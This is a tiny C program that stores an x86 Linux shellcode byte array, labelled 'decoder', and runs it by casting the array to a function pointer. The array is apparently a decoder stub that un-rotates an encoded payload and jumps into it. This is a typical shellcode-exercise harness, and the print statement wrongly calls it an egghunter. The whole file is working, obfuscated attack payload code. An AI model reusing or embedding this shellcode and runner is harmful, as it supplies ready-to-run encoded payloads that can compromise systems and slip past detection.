#include <stdio.h>  
#include <string.h>  

unsigned char decoder[]="\x31\xc9\xf7\xe1\xeb\x16\x5f\x80\x3c\x07\xaa\x74\x07\xc0\x04\x07\x03\x40\xeb\xf3\xff\xe7\xb0\x01\x30\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x26\x5a\x26\x39\xfe\x3c\x0a\x0d\xcd\xe5\x6e\x0d\x0d\xe5\xe5\x4c\x2d\x31\x7c\x0a\x6a\x31\x3c\x16\x61\xb9\x10\xaa";
int main()  
{  
    printf("Egghunter size: %d\n", strlen(decoder));  
    int (*ret)() = (int(*)())decoder;  
    ret();  
}  

